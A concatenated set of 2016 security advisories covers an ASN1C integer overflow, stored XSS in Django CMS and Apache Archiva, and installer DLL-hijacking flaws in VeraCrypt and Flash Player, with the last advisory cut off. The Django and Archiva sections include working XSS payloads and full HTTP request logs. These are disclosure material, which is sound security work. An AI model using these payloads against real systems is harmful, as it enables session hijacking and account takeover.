'<installdir>clib' (which corresponds to the Visual C++ 2013 version).
In 'rtxMemHeapAlloc', after initial checks to the context's internal
memory heap ('pMemHeap') which may entail calls to 'rtxMemHeapCreate'
and 'rtxMemHeapCheck', the 'nbytes' argument ('arg_4' in the
disassembly) is manipulated. Its value is rounded to the next multiple
of 8 bytes using 'ecx' and storing the result in 'var_9C'. To accomplish
this, a value of '7' is added to 'ecx' before making the shift without
checking the resulting value, which could lead to an integer overflow of
the 32-bit register if the value of 'nbytes' is '0xFFFFFFF9' or higher.
The following assembly blocks illustrate this.
/-----
loc_A6:
mov ecx, [ebp+arg_4]
add ecx, 7
shr ecx, 3
mov [ebp+var_9C], ecx
mov edx, [ebp+var_18]
mov eax, [edx+18h]
and eax, 20000000h
jnz short loc_D2
-----/
The 'rtxMemHeapAlloc' function does not perform any validation of the
'nbytes' argument and therefore it is up to the caller to make sure its
value does not overflow when the allocator rounds it up to a multiple of
8 bytes and adds 20 bytes to the memory to be allocated to accomodate a
heap control structure. However, the caller of 'rtxMemHeapAlloc' will be
a function automatically generated by the ASN1C compiler and typically
will not have any size contrains on the arguments passed to
'rtxMemHeapAlloc', and indireddctly to 'malloc', unless added manually.
The resulting value of 'var_9C' is checked against the constant '0FFFCh'
to decide whether to allocate the memory requested using the internal
heap implementation or the system's memory allocator, which is usually
available through the 'malloc' function.
A similar pattern is found later when 'malloc' is called.
If 'malloc' is used, the value in 'var_9C' is discarded in favor of the
original value of the 'nbytes' argument. This value is added to '14h' in
'ecx' before saving it to 'var_E8' without any validation which could
lead to an integer overflow if the value of argument 'nbytes' is
'0xFFFFFFEC' or greater. The resulting value in 'var_E8' is then used as
the argument for the call to 'malloc'. As a consequence, large values
passsed in the 'nbytes' argument to 'rtxMemHeapAlloc' will result in a
size calculation that wraps around and ends up calling 'malloc' with a
size argument that is less that what is needed to store the data that
will be copied to it later on. The following assembly block illustrates
this.
/-----
loc_D2:
mov ecx, [ebp+arg_4]
add ecx, 14h
mov [ebp+var_E8], ecx
mov edx, [ebp+var_E8]
push edx
mov eax, [ebp+var_18]
mov ecx, [eax+1Ch]
call ecx
add esp, 4
mov [ebp+var_24], eax
cmp [ebp+var_24], 0
jnz short loc_120
-----/
Due to the fact that the bugs are located in the core runtime support
library, it is hard to assess its exploitability in all scenarios but it
is safe to assume that it would lead attacker controlled memory
corruption of either the system's heap (if 'malloc' is called) or in the
internal memory allocator (if the number of bytes requested is below the
aforementioned threshold). Since heap control structures can be
overwritten with attacker controlled data, it is safe to assume that
remote code execution can be achieved in many scenarios in which ASN.1
parsing code generated by the ASN1C compiler for C/C++ is used without
manual modification. Manual modification of automatically generated code
is generally not recommended so mechanisms that would prevent triggering
of these bugs are not likely to be found in deployed systems.
As an illustrative example, the 3GPP APIs can be mentioned, particularly
the '[NAS/RRC add-on for ASN1C SDK]'[7]. The C code generated by the
ASN1C for the RRC decoder ('EUTRA-RRC-DefinitionsDec.c'), uses
'rtxMemHeapAlloc' for the allocation of the extension optional bits of
the extension elements) where the length, not known in advance, is
obtained from the encoded element received from an untrusted source,
calling 'pd_SmallLength' which allows unconstrained whole numbers,
resulting in a call to 'rtxMemHeapAlloc' with an externally controlled
'nbytes' argument. The following ASN1C compiler generated C code snipped
from the function 'asn1PD_RadioResourceConfigCommonSIB' illustrates this.
/-----
/* decode extension elements */
if (extbit) {
OSOCTET* poptbits;
/* decode extension optional bits length */
stat = pd_SmallLength (pctxt, &bitcnt);
if (stat != 0) return stat;
poptbits = (OSOCTET*) rtxMemAlloc (pctxt, bitcnt);
if (0 == poptbits) return RTERR_NOMEM;
for (i_ = 0; i_ < bitcnt; i_++) {
stat = DEC_BIT (pctxt, &poptbits[i_]);
if (stat != 0) {
rtxMemFreePtr (pctxt, poptbits);
return stat;
}
}
-----/
8. *Report Timeline*
. 2016-06-03:
Sent email to Objective Systems Inc. requesting security contact
information.
. 2016-06-06:
Vendor responded with contact information to send the bug report
in plaintext.
. 2016-06-06:
Bug report sent in plaintext to the email address provided by
the vendor. The report included technical details to identify and
reproduce the bug. Vendor is notified that CERT/CC will be contacted and
that a security bulletin will be published. Publication date set to July
6, 2016.
. 2016-06-08:
CERT/CC contacted, bug report filed in a web form, encrypted
using the CERT/CC PGP public key.
. 2016-06-08:
CERT/CC replied by email acknowledging report, assigned VR-198
as internal tracking number.
. 2016-06-08:
Email sent to CERT/CC saying that the bug is present in code
generated by the ASN1C compiler for C, it is also likely that C++ code
is also buggy and not likely in Java code but neither C++ not Java code
were tested.
. 2016-06-10:
Email sent to the vendor requesting acknowledgement of the
report sent on June 6 and noting that CERT/CC was contacted.
. 2016-06-10:
Vendor acknowledged reception of the bug report and stated that
it will look into the issue as time permits.
. 2016-06-14:
Objective Systems Inc. indicated that the issues were fixed in
an interim v7.0.1.x version of ASN1C that will be available to customers
upon request and that the next v7.0.2 release will incorporate the
fixes. Offered a version of ASN1C updated with the fixes for testing.
. 2016-06-14:
Programa STIC replied to the vendor accepting the offer for the
pre-release version of ASN1C with the fixes and stated it is on track
for publication on July 6.
. 2016-06-15:
Programa STIC notified CERT/CC that the vendor has fixed the
issues and will make available an updated version of ASN1C to customers
upon request. Asked CERT/CC about plans for dissemination of the report
and whether it had contact information for ITU IMPACT. Publication is
still planned for July 6.
. 2016-06-16:
Objective Systems provided a fixed version of ASN1C for testing.
. 2016-06-16:
CERT/CC replied saying they have no contact information for ITU
IMPACT but will try to reach as many potentially affected vendors as
possible. The vulnerabilities were assigned the CVE-2016-5080
identifier. CERT/CC will likely publish a Vulnerability Note on its
website once the report becomes public.
. 2016-06-16:
Programa STIC said that vendors will need to assess whether
they're vulnerable and determine if they want to ask Objective Systems
for the fixed interim v7.0.1.x version or wait for the v7.0.2 release.
Programa STIC recommends the former since the v7.0.2 release may include
non-security fixed and feature and does not have a estimated release
date at the moment.
. 2016-06-27:
Programa STIC sent mail to CERT/CC requesting a status update
and saying its on track to publish on July 6.
. 2016-07-01:
CERT/CC replied saying one of the contacted vendors requested to
delay the publication for 2 months while they investigate their
products. Asked if Programa STIC would accept the request or proceed
with the current publication date.
. 2016-07-01:
Programa STIC replied that a two month delay seemed excessive
and that at least 2 additional factors should be weighed: 1. memory
corruption bugs in ASN.1 related components of an LTE stack have been
announced or hinted at in several infosec conference presentations over
the past few weeks and its likely the same or similar bugs will become
public soon. 2. Objective Systems has already produced a fix that is
available upon request to all its customers. It does not seem reasonable
to impose a 2 month publication delay on every other vendor. Asked
CERT/CC: 1. Did other vendors request to postpone publication or
indicated they were or were not vulnerable? 2. Did CERT/CC disseminate
the information to any other parties?
. 2016-07-01:
CERT/CC indicated they've contacted as many vendors as possible,
US-CERT and international CERT partners and that only one vendor has
requested to delay publication so far. Agreed that proceeding with the
original publication schedule is reasonable given the partial disclosure
due to dissemination that already occurred plus the fact that a fix is
available
. 2016-07-01:
Programa STIC sent mail to CERT/CC saying that for the moment it
will proceed with the original deadline but make a final decision on July 5.
. 2016-07-06:
Programa STIC sent email to CERT/CC indicating it decided to
postpone publication for a week to give vendors some additional time to
assess whether they are vulnerable and plan for issuing fixes. The new
publication date was set to July 13.
. 2016-07-06:
CERT/CC replied that it will notify vendors of the new
publication date.
. 2016-07-13:
CERT/CC asked if the security advisory was published and
requested an URL for it.
. 2016-07-14:
Programa STIC told CERT/CC that publication was postponed to
Monday, July 18.
. 2016-07-13:
Programa STIC sent mail to Objective Systems Inc. notifying them
that the security advisory will be published on July 18.
. 2016-07-13:
Objective Systems Inc. asked if a CVE ID has been assigned to the
issue.
. 2016-07-13:
Programa STIC sent mail to Objective Systems Inc. saying
CVE-2016-5080 was assigned by CERT and promising to send draft of the
security advisory when ready for publication.
. 2016-07-14:
Programa STIC sent email to Objective Systems informing them that
the security advisory will bul published on July 18 with guidance for
potentially affected vendors to contact them to request a fixed version
of the ASN1C compiler for C/C++.
. 2016-07-18:
Security advisory was published.
9. *References*
[1] Abstract Syntaxt Notation One (ASN1)
http://www.itu.int/en/ITU-T/asn1/Pages/introduction.aspx
[2] ASN.1 Project (ITU)
http://www.itu.int/en/ITU-T/asn1/Pages/asn1_project.aspx
[3] ASN.1 Applications and Standards
http://www.oss.com/asn1/resources/standards-use-asn1.html
[4] CERT/CC Vulnerability Notes
http://www.kb.cert.org/vuls
[5] Objective Systems Inc.
https://www.obj-sys.com
[6] Vendors possibly using ASN.1 compiler for C/C++.
https://www.obj-sys.com/customers/
[7] Non-Access Stratum (NAS) LTE, GERAN-RRC, and other non-ASN.1 APIs
3GPP TS 24.007 24.008 24.011 24.301 44.018.
https://www.obj-sys.com/products/asn1apis/lte_3gpp_apis.php
10. *About Fundación Dr. Manuel Sadosky*
The Dr. Manuel Sadosky Foundation is a mixed (public / private)
institution whose goal is to promote stronger and closer interaction
between industry and the scientific-technological system in all aspects
related to Information and Communications Technology (ICT). The
Foundation was formally created by a Presidential Decree in 2009. Its
Chairman is the Minister of Science, Technology, and Productive
Innovation of Argentina; and the Vice-chairmen are the chairmen of the
country’s most important ICT chambers: The Software and Computer
Services Chamber (CESSI) and the Argentine Computing and
Telecommunications Chamber (CICOMRA). For more information visit:
http://www.fundacionsadosky.org.ar
11. *Copyright Notice*
The contents of this advisory are copyright (c) 2014-2016 Fundación
Sadosky and are licensed under a Creative Commons Attribution
Non-Commercial Share-Alike 4.0 License:
http://creativecommons.org/licenses/by-nc-sa/4.0/
--
Programa de Seguridad en TIC
Fundación Dr. Manuel Sadosky
Av. Córdoba 744 Piso 5 Oficina I
TE/FAX: 4328-5164"
2702,Django CMS v3.3.0 - (Editor Snippet) Persistent Web Vulnerability (CVE-2016-6186),,CVE-2016-6186,"Document Title:
===============
Django CMS v3.3.0 - (Editor Snippet) Persistent Web Vulnerability (CVE-2016-6186)
References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1869
Security Release: https://www.djangoproject.com/weblog/2016/jul/18/security-releases/
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-6186
CVE-ID:
=======
CVE-2016-6186
Release Date:
=============
2016-07-19
Vulnerability Laboratory ID (VL-ID):
====================================
1869
Common Vulnerability Scoring System:
====================================
3.5
Product & Service Introduction:
===============================
django CMS is a modern web publishing platform built with Django, the web application framework for perfectionists with deadlines.
django CMS offers out-of-the-box support for the common features you’d expect from a CMS, but can also be easily customised and
extended by developers to create a site that is tailored to their precise needs.
(Copy of the Homepage: http://docs.django-cms.org/en/release-3.3.x/upgrade/3.3.html )
Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered an application-side vulnerability (CVE-2016-6186) in the official Django v3.3.0 Content Management System.
Vulnerability Disclosure Timeline:
==================================
2016-07-03: Researcher Notification & Coordination (Benjamin Kunz Mejri - Evolution Security GmbH)
2016-07-04 Vendor Notification (Django Security Team)
2016-07-07: Vendor Response/Feedback (Django Security Team)
2016-07-18: Vendor Fix/Patch (Django Service Developer Team)
2016-07-19: Public Disclosure (Vulnerability Laboratory)
Discovery Status:
=================
Published
Affected Product(s):
====================
Divio AG
Product: Django Framework - Content Management System 3.3.0
Divio AG
Product: Django Framework - Content Management System MDB, 1.10, 1.9, 1.8 and 1.7
Exploitation Technique:
=======================
Remote
Severity Level:
===============
Medium
Technical Details & Description:
================================
A persistent input validation web vulnerability has been discovered in the official Django v3.3.0 Content Management System.
The security vulnerability allows remote attackers or privileged user accounts to inject own malicious script codes to the
application-side of the vulnerable modules web context.
The persistent web vulnerability is located in the `Name` value of the `Editors - Code Snippet` module POST method request.
Remote attackers are able to inject own malicious script code to the snippets name input field to provoke a persistent execution.
The injection point is the snippets add module of the editor. The execution point occurs in the `./djangocms_snippet/snippet/`
data listing after the add. The data context is not escaped or parsed on add to select and thus results in an execute of any
payload inside of the option tag.
The attacker vector of the vulnerability is persistent because of the data is stored on add and request method to inject is POST.
The vulnerability can be exploited against other privileged user accounts of the django application by interaction with already
existing snippets on add.
Already added elements become visible for the other user accounts as well on add interaction. The unescaped data is stored in
the database of the web-application but when rendered in the frontend or in the edit mode, it's properly escaped.
The security risk of the vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.5.
Exploitation of the vulnerability requires a low privileged web-application user account and only low user interaction.
Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent external
redirects to malicious source and persistent manipulation of affected or connected application modules.
Request Method(s):
[+] POST
Vulnerable Module(s):
[+] Editor - Snippets (Add)
Vulnerable Input(s):
[+] Name
Parameter(s):
[+] select
Affected Module(s):
[+] Snippets Options Listing [./djangocms_snippet/snippet/] - option
Proof of Concept (PoC):
=======================
The application-side validation web vulnerability can be exploited by low and high privileged web-application user accounts with low user interaction.
For security demonstration or to reproduce the application-side web vulnerability follow the provided information and steps below to continue.
Manual steps to reproduce the vulnerability ...
1. Login to your django cms website with version 3.3.0
2. Open the structure module
3. Click to edit a page module
Note: Now the editor opens with the main default plugins
4. Mark a text passage and click to the code snippets plugin that is configured by default installation
5. Click the plus to add a new snippet of code
6. Inject a script code payload in java-script to the input field of the Name
7. Save the entry iva POST method request
8. Now click the box to choose the vulnerable injected payload
9. The script code payload executes in the box listing without secure parse or filter to encode
10. Successful reproduce of the application-side validation vulnerability in the editors snippet module!
Note:
Multiple accounts can be exploited by the inject of snippets. When another privileged user account includes a snippet
the stable saved categories provoke the execution of the payload.
PoC: Snippet Module [./djangocms_snippet/snippet/] (Execution Point) <select> <option>
...
<fieldset class=""module aligned "">
<div class=""form-row field-snippet"">
<div>
<label class=""required"" for=""id_snippet"">Snippet:</label>
<div class=""related-widget-wrapper"">
<select id=""id_snippet"" name=""snippet"">
<option value="""">---------</option>
<option value=""3"" selected=""selected"">""&gt;&lt;""<img src=""x"">%20%20&gt;""<iframe src=""a"">%20<iframe>
""><""<img src=""x"">%20%20>""<iframe src=http://www.vulnerability-lab.com onload=alert(document.cookie)<>[PERSISTENT SCRIPT CODE EXECUTION VIA SNIPPET NAME!]%20<iframe></iframe></option>
<option value=""1"">Social AddThis</option>
<option value=""2"">tour ""&gt;&lt;""&lt;img src=""x""&gt;%20%20&gt;""&lt;iframe src=a&gt;%20&lt;iframe&gt;</option>
</select>
<a href=""/en/admin/djangocms_snippet/snippet/3/?_to_field=id&amp;_popup=1"" class=""related-widget-wrapper-link change-related""
id=""change_id_snippet"" data-href-template=""/en/admin/djangocms_snippet/snippet/__fk__/?_to_field=id&amp;_popup=1"" title=""Change selected Snippet"">
<img src=""/static/admin/img/icon_changelink.gif"" alt=""Change"" height=""10"" width=""10"">
</a>
<a class=""related-widget-wrapper-link add-related"" id=""add_id_snippet"" href=""/en/admin/djangocms_snippet/snippet/add/?_to_field=id&amp;_popup=1"" title=""Add another Snippet"">
<img src=""/static/admin/img/icon_addlink.gif"" alt=""Add"" height=""10"" width=""10"">
</a>
</div>
</div>
</div>
</fieldset>
...
--- PoC Session Logs [POST] (Injection) [GET] (Execution) ---
Status: 200[OK]
POST http://django3-3-0.localhost:8080/en/admin/djangocms_snippet/snippet/2/?_to_field=id&_popup=1
Request Header:
Host[django3-3-0.localhost:8080]
User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0]
Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
Referer[http://django3-3-0.localhost:8080/en/admin/djangocms_snippet/snippet/2/?_to_field=id&_popup=1]
Cookie[csrftoken=LSAWc8qD0fUpl1Yz11W8FMfLPYSo6Dwm; sessionid=eg4ycotyuzu144c85qd9ve12jwn1ob21; django_language=en]
Connection[keep-alive]
POST-Daten:
POSTDATA =-----------------------------30880199939743
Content-Disposition: form-data; name=""csrfmiddlewaretoken""
LSAWc8qD0fUpl1Yz11W8FMfLPYSo6Dwm
-----------------------------30880199939743
Content-Disposition: form-data; name=""_popup""
1
-----------------------------30880199939743
Content-Disposition: form-data; name=""_to_field""
id
-----------------------------30880199939743
Content-Disposition: form-data; name=""name""
test <img src=""x"">%20%20&gt;""<iframe src=""a"">%20<iframe>
""><""<img src=""x"">%20%20>""<iframe src=a>[PERSISTENT INJECTED SCRIPT CODE VIA SNIPPET NAME!]%20<iframe>
-----------------------------30880199939743
Content-Disposition: form-data; name=""html""
sd
-----------------------------30880199939743
Content-Disposition: form-data; name=""template""
aldryn_tour/tour.html
-----------------------------30880199939743
Content-Disposition: form-data; name=""slug""
tour
-----------------------------30880199939743
Content-Disposition: form-data; name=""_save""
Save
-----------------------------30880199939743--
Response Header:
Transfer-Encoding[chunked]
X-Proxy-Request-Received[0]
Server[Aldryn-LoadBalancer/2.0]
Date[Mon, 04 Jul 2016 09:34:19 GMT]
X-Aldryn-App[django-cms-3-3-demo-sopegose-stage]
Content-Language[en]
Expires[Mon, 04 Jul 2016 09:34:19 GMT]
Vary[Cookie]
Last-Modified[Mon, 04 Jul 2016 09:34:19 GMT]
Cache-Control[no-cache, no-store, must-revalidate, max-age=0]
X-Frame-Options[SAMEORIGIN]
Content-Type[text/html; charset=utf-8]
Set-Cookie[sessionid=eg4ycotyuzu144c85qd9ve12jwn1ob21; expires=Mon, 18-Jul-2016 09:34:19 GMT; Max-Age=1209600; Path=/]
-
Status: 301[MOVED PERMANENTLY]
GET http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/add-plugin/x[PERSISTENT SCRIPT CODE EXECUTION VIA SNIPPET NAME!]
Request Header:
Host[django3-3-0.localhost:8080]
User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0]
Accept[*/*]
Accept-Language[de,en-US;q=0.7,en;q=0.3]
Accept-Encoding[gzip, deflate]
Referer[http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/add-plugin/?placeholder_id=6&plugin_type=SnippetPlugin&plugin_parent=9&plugin_language=en]
Cookie[csrftoken=LSAWc8qD0fUpl1Yz11W8FMfLPYSo6Dwm; sessionid=eg4ycotyuzu144c85qd9ve12jwn1ob21; django_language=en]
Connection[keep-alive]
Response Header:
Server[Aldryn-LoadBalancer/2.0]
Date[Mon, 04 Jul 2016 09:34:19 GMT]
Vary[Cookie]
X-Frame-Options[SAMEORIGIN]
Content-Type[text/html; charset=utf-8]
Location[http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/add-plugin/x/]
Content-Language[en]
-
Status: 200[OK]
GET http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/add-plugin/a/[PERSISTENT SCRIPT CODE EXECUTION VIA SNIPPET NAME!]
Request Header:
Host[django3-3-0.localhost:8080]
User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0]
Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
Accept-Language[de,en-US;q=0.7,en;q=0.3]
Accept-Encoding[gzip, deflate]
Referer[http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/add-plugin/?placeholder_id=6&plugin_type=SnippetPlugin&plugin_parent=9&plugin_language=en]
Cookie[csrftoken=LSAWc8qD0fUpl1Yz11W8FMfLPYSo6Dwm; sessionid=eg4ycotyuzu144c85qd9ve12jwn1ob21; django_language=en]
Connection[keep-alive]
Response Header:
Transfer-Encoding[chunked]
X-Proxy-Request-Received[0]
Server[Aldryn-LoadBalancer/2.0]
Date[Mon, 04 Jul 2016 09:34:19 GMT]
Content-Language[en]
Expires[Mon, 04 Jul 2016 09:34:19 GMT]
Vary[Cookie]
Last-Modified[Mon, 04 Jul 2016 09:34:19 GMT]
Cache-Control[no-cache, no-store, must-revalidate, max-age=0]
X-Frame-Options[SAMEORIGIN]
Content-Type[text/html]
Reference(s):
http://django3-3-0.localhost:8080/
http://django3-3-0.localhost:8080/en/
http://django3-3-0.localhost:8080/en/admin/
http://django3-3-0.localhost:8080/en/admin/cms/
http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/
http://django3-3-0.localhost:8080/en/admin/djangocms_snippet/snippet/
http://django3-3-0.localhost:8080/en/admin/djangocms_snippet/snippet/2/
http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/add-plugin/
http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/edit-plugin/
http://django3-3-0.localhost:8080/en/admin/cms/staticplaceholder/edit-plugin/9/
Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse of the vulnerable Name input field in the add snippets editor module.
Restrict the input and disallow the usage of special chars. Escape the entries in case of emergency and use plain-text values.
Encode in the snippets module listing the vulnerable box with the name listing to prevent the execution point of the vulnerability.
Resolution:
Patches to resolve the issues have been applied to Django's master development branch and the 1.10, 1.9, and 1.8 release branches.
The patches may be obtained from the following changesets:
- On the development master branch
- On the 1.10 release branch
- On the 1.9 release branch
- On the 1.8 release branch
The following new releases have been issued:
- Django 1.10rc1
- Django 1.9.8
- Django 1.8.14
Reference(s):
https://developer.mozilla.org/en-US/docs/Web/API/element/innerHTML
Security Risk:
==============
The security risk of the application-side input validation web vulnerability in the django cms is estimated as medium. (CVSS 3.5)
Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm evolution-sec com) [www.vulnerability-lab.com]
Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or implied,
including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage,
including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised
of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing
limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface websites, hack into databases or trade with stolen data.
Domains: www.vulnerability-lab.com - www.vuln-lab.com - www.evolution-sec.com
Contact: admin vulnerability-lab com - research vulnerability-lab com - admin evolution-sec com
Section: magazine.vulnerability-lab.com - vulnerability-lab.com/contact.php - evolution-sec.com/contact
Social: twitter.com/vuln_lab - facebook.com/VulnerabilityLab - youtube.com/user/vulnerability0lab
Feeds: vulnerability-lab.com/rss/rss.php - vulnerability-lab.com/rss/rss_upcoming.php - vulnerability-lab.com/rss/rss_news.php
Programs: vulnerability-lab.com/submit.php - vulnerability-lab.com/list-of-bug-bounty-programs.php - vulnerability-lab.com/register.php
Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically
redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or
its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific
authors or managers. To record, list, modify, use or edit our material contact (admin@ or research vulnerability-lab com) to get a ask permission.
Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™
--
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research vulnerability-lab com"
2710,[CVE-2016-1281] NOT FIXED: VeraCrypt*Setup*.exe still vulnerable to DLL hijacking,,CVE-2016-1281,"Hi @ll,
this is basically a followup to <http://seclists.org/oss-sec/2016/q1/58>
CVE-2016-1281 is NOT FIXED!
I've retested the current ""VeraCrypt Setup 1.17.exe"" on a fully
patched Windows 7, and it is STILL (or AGAIN) vulnerable there.
The following DLLs are loaded from the ""application directory""
and their DllMain() executed: VSSAPI.dll, ATL.dll, VSSTrace.dll.
See <https://cwe.mitre.org/data/definitions/426.html>,
<https://cwe.mitre.org/data/definitions/427.html> and
<https://capec.mitre.org/data/definitions/471.html> for details
about this well-known and well-documented beginner's error!
Due to the application manifest embedded in the executable installer
which specifies ""requireAdministrator"" the installer is run with
administrative privileges (""protected"" administrators are prompted
for consent, unprivileged standard users are prompted for an
administrator password); execution of the DLLs therefore results
in an escalation of privilege!
For software downloaded with a web browser the ""application
directory"" is typically the user's ""Downloads"" directory: see
<https://insights.sei.cmu.edu/cert/2008/09/carpet-bombing-and-directory-poisoning.html>,
<http://blog.acrossecurity.com/2012/02/downloads-folder-binary-planting.html>
and <http://seclists.org/fulldisclosure/2012/Aug/134> for prior
art!
Mitigation:
~~~~~~~~~~~
DUMP executable installers, build packages for the target OS' native
installer instead!
See <http://home.arcor.de/skanthak/!execute.html>
as well as <http://home.arcor.de/skanthak/sentinel.html> for the long
sad story of these vulnerabilities.
stay tuned
Stefan Kanthak
Timeline:
~~~~~~~~~
2015-12-23 vulnerability report sent to author
2016-01-03 author confirmed vulnerability, got CVE-2016-1281
worked with author until he finally was able to build
an installer which didn't show this vulnerability.
Also notified author:
""as soon as Microsoft introduces new/other dependencies
between Windows' system DLLs or refactors them (again)
this vulnerability will VERY likely resurface again.""
2016-01-11 report published by author (see above)
2016-07-01 vulnerability report sent to author (""I told you so!"")
NO RESPONSE
2016-07-17 report published"
2723,"[CVE-2016-1014, CVE-2016-4247] Executable installers are vulnerable^WEVIL (case 35): Adobe's Flash Player (un)installers",,CVE-2016-1014,"Hi @ll,
the executable installers of Flash Player released 2016-06-15
fixed CVE-2016-1014 in the second attempt, but another vulnerability
remained: they create(d) and use(d) UNSAFE temporary subdirectories
into which they copy/ied themselves and extract(ed) a file ""fpb.tmp""
which they load(ed) and execute(d) later with elevated privileges.
An unprivileged user can/could overwrite both files between creation
and execution and gain elevation of privilege.
See <https://cwe.mitre.org/data/definitions/379.html> for this type
of well-known and well-documented vulnerability!
stay tuned
Stefan Kanthak
Timeline:
~~~~~~~~~
2016-03-12 initial report sent to Adobe PSIRT
2016-03-13 Adobe PSIRT acknowledges vulnerability and assigns
PSIRT-4904
2016-04-06 Adobe PSIRT informs about CVE assigned and upcoming
fix scheduled for release later that week
2016-04-17 notification sent to Adobe PSIRT: fix is incomplete,
vulnerability persists
2016-04-17 Adobe PSIRT acknowledges receipt of second report
2016-04-17 Adobe PSIRT acknowledges vulnerability ... again
2016-06-17 Adobe released fixed Flash Player (un)installers,
report for CVE-2016-1014 published
2016-06-17 new report sent to Adobe PSIRT: unsafe TEMP
directory allows escalation of privilege
2016-06-17 Adobe PSIRT acknowledges receipt
2016-06-17 Adobe PSIRT acknowledges vulnerability and assigns
PSIRT-5480
2016-07-10 Adobe PSIRT informs about CVE assigned and upcoming
fix scheduled for release later this week
2016-07-12 Adobe released fixed Flash Player (un)installers,
report for CVE-2016-4247 published"
2731,[RCESEC-2016-004][CVE-2016-5005] Apache Archiva 1.3.9 admin/addProxyConnector_commit.action connector.sourceRepoId Persistent Cross-Site Scripting,,CVE-2016-5005,"RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: Apache Archiva
Vendor URL: https://archiva.apache.org
Type: Cross-Site Scripting [CWE-79]
Date found: 2016-05-31
Date published: 2016-07-11
CVSSv3 Score: 5.5 (CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N)
CVE: CVE-2016-5005
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
Apache Archiva v1.3.9
older versions may be affected too.
4. INTRODUCTION
===============
Apache Archiva™ is an extensible repository management software that helps
taking care of your own personal or enterprise-wide build artifact
repository. It is the perfect companion for build tools such as Maven,
Continuum, and ANT.
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
The script ""/archiva/admin/addProxyConnector_commit.action"" is vulnerable to
an authenticated persistent Cross-Site Scripting vulnerability when user-
supplied input to the HTTP POST parameter ""connector.sourceRepoId"" is
processed by the web application. Since the application does not properly
validate and sanitize this parameter, it is possible to place arbitrary
script code permanently on the ""Administration - Proxy Connectors"" page as
well as on the ""Admin: Delete Proxy Connector"" page.
The following Proof-of-Concept triggers this vulnerability and adds a new
proxy connector called ""XSS<script>alert(document.cookie)</script>"":
POST /archiva/admin/addProxyConnector_commit.action HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101
Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=1vabu6a1f9wye;
rbkSignon=7574033ea6d44b4a9722cfa53a7b4001;
_ga=GA1.2.1956020753.1461333249;
__utma=86544839.1956020753.1461333249.1461575160.1461575160.1;
__utmz=86544839.1461575160.1.1.utmcsr=premium_main|utmccn=(not%20set)|utmcmd=(not%20set)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 567
pattern=&connector.order=0&connector.proxyId=%28direct+connection%29&connector.sourceRepoId=XSS<script>alert(document.cookie)</script>&connector.targetRepoId=com.springsource.repository.bundles.external&connector.policies%5B%27propagate-errors-on-update%27%5D=always&connector.policies%5B%27cache-failures%27%5D=no&connector.policies%5B%27releases%27%5D=always&connector.policies%5B%27propagate-errors%27%5D=stop&connector.policies%5B%27checksum%27%5D=fail&connector.policies%5B%27snapshots%27%5D=always&propertyKey=&propertyValue=&blackListPattern=&whiteListPattern=
The payload is then reflected on the ""Administration - Proxy Connectors"":
<div class=""managedRepo"">
<img src=""/archiva/images/archiva-splat-32.gif"">
<p class=""id"">XSS<script>alert(document.cookie)</script></p>
<p class=""name""></p>
</div>
And on the ""Admin: Delete Proxy Connector"" page:
<p>
Are you sure you want to delete proxy connector <code>[
XSS<script>alert(document.cookie)</script> ,
maven2-repository.dev.java.net ]</code> ?
</p>
6. RISK
=======
To successfully exploit this vulnerability, a user with administrative
rights must trick another authenticated user with administrative rights
to visit one of the affected pages. Since this scenario is quite unlikely,
the attack likelihood can be increased by combining this vulnerability
with the Cross-Site Request Forgery vulnerability as described in
RCESEC-2016-003 (CVE-2016-4469).
The vulnerability allows remote attackers to permanently embed arbitrary
script code into the context of the Apache Archiva administrative backend
interface, which offers a wide range of possible attacks such as stealing
cookies or attacking the browser and its components of a user visiting the
page.
7. SOLUTION
===========
